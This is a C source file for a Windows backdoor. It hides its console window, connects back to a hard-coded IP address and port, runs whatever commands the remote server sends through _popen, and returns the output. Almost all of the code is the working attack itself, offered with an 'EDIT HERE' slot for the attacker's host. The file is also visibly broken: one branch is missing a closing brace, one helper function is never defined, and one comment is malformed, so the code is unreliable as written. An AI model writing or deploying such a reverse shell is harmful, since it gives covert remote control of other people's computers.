#include <stdio.h>     //standard input/output
#include <stdlib.h>    //standard utilities library
#include <unistd.h>    //access to the POSIX operating system API
#include <winsock2.h>  //windows sockets
#include <windows.h>   //declarations for all functions in Windows API
#include <winuser.h>   //windows controls
#include <wininet.h>   //windows internet interfaces
#include <windowsx.h>  //windows programming interfaces
#include <string.h>    //manupulate strings (char arrays)
#include <sys/stat.h>  //stat() function prototypes
#include <sys/types.h> //other function prototypes


//set host IP Address and Port [EDIT HERE]
char *ServIP = "192.168.56.8";
unsigned short ServPort = 6500;



int sock;


void Shell(){
	char buffer[1024]; //contain command from server
	char container[1024]; //check if command > 1024
	char total_response[18384]; //concatenate when command > 1024

	while (1)
	{
		jump:
		memset(buffer, 0, sizeof(buffer));
		memset(container,0, sizeof(container));
		memset(total_response, 0, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer), 0); //receive command from server

		//quit server with q command
		if (strncmp("q", buffer, 1) == 0)
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
        else if(strncmp("cd ",buffer, 3) ==0){
				chdir(str_cut(buffer,3,90));
	
		else
		{
			//fp = file descriptor of buffer
			FILE *fp;
			fp = _popen(buffer, "r");//read and execute command

			//concatenation process when command > 1024
			while(fgets(container, sizeof(container), fp) != NULL)
			{
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			pclose(fp);
		}
	}

}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	//create new window handle
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL); 
	ShowWindow(stealth, 0); 

	/structure for serveraddress
	struct sockaddr_in ServAddr;
	WSADATA wsaData; //contain winsock.dll info

	//check winsock.dll status for errors
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
	{
		exit(1);
	}

	//define socket object
	sock = socket(AF_INET, SOCK_STREAM, 0); 
	memset(&ServAddr, 0, sizeof(ServAddr)); 


	//set ServAddr parameters
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); 
	ServAddr.sin_port = htons(ServPort); 


	//wait for server connection to establish every after a specified time
	start :
	while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(5);
		goto start;
	}

	Shell();
}

